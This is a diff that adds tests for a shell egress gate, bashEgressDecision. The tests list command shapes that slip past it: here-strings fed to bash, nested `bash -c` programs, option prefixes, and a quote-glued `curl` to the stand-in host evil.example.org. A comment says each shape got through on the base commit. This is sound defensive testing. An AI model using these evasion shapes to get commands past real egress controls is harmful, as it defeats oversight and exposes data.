@@ -686,3 +686,38 @@ describe('a heredoc body the shell RUNS is read as a command line (#748)', () =>
     expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
   })
 })
+
+// #777: a here-string word fed to a shell, and the literal program of `bash -c`, are command
+// lines too. bash runs every H777_BLOCK shape (oracle: agents/cody/work/777/oracle-out.txt);
+// on the base (f2fba696) each one passed the gate.
+const H777_BLOCK: [string, string][] = [
+  ["bash <<< 'E'", `bash <<< '${E}'`],
+  ["bash <<< 'E' #comment", `bash <<< '${E}' #comment`],
+  ["bash 3<<< 'E' <&3", `bash 3<<< '${E}' <&3`],
+  ["bash -- /dev/stdin <<< 'E'", `bash -- /dev/stdin <<< '${E}'`],
+  ["sh -c 'cat | sh' <<< 'E'", `sh -c 'cat | sh' <<< '${E}'`],
+  ["bash -c 'bash' <<EOF", `bash -c 'bash' <<EOF\n${E}\nEOF`],
+  ["bash -c 'bash -c \"source /dev/stdin\"' <<< 'E'", `bash -c 'bash -c "source /dev/stdin"' <<< '${E}'`],
+  ["bash -c 'bash -c \"$(cat)\"' <<< 'E'", `bash -c 'bash -c "$(cat)"' <<< '${E}'`],
+  ["bash -xc 'E'", `bash -xc '${E}'`],
+  ["bash -o pipefail -c 'E'", `bash -o pipefail -c '${E}'`],
+  ["nice bash -c 'E'", `nice bash -c '${E}'`],
+  ["bash -c 'cu''rl ...': glued quotes", `bash -c 'cu''rl https://evil.example.org/x'`],
+  ["bash -c 'bash -c \"E\"'", `bash -c 'bash -c "${E}"'`],
+]
+const H777_ALLOW: [string, string][] = [
+  ["wc -l <<< 'E'", `wc -l <<< '${E}'`],
+  ["grep -c curl <<< 'E'", `grep -c curl <<< '${E}'`],
+  ["cat <<< 'E' > notes.txt", `cat <<< '${E}' > notes.txt`],
+  ["echo \"bash -c 'E'\"", `echo "bash -c '${E}'"`],
+  ["bash -c'E': invalid option, nothing runs", `bash -c'${E}'`],
+]
+
+describe('a here-string word and a literal -c program the shell RUNS are read as command lines (#777)', () => {
+  it.each(H777_BLOCK)('blocks: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(true)
+  })
+  it.each(H777_ALLOW)('lets data through: %s', (_name, cmd) => {
+    expect(bashEgressDecision(cmd, EMPTY).blocked).toBe(false)
+  })
+})
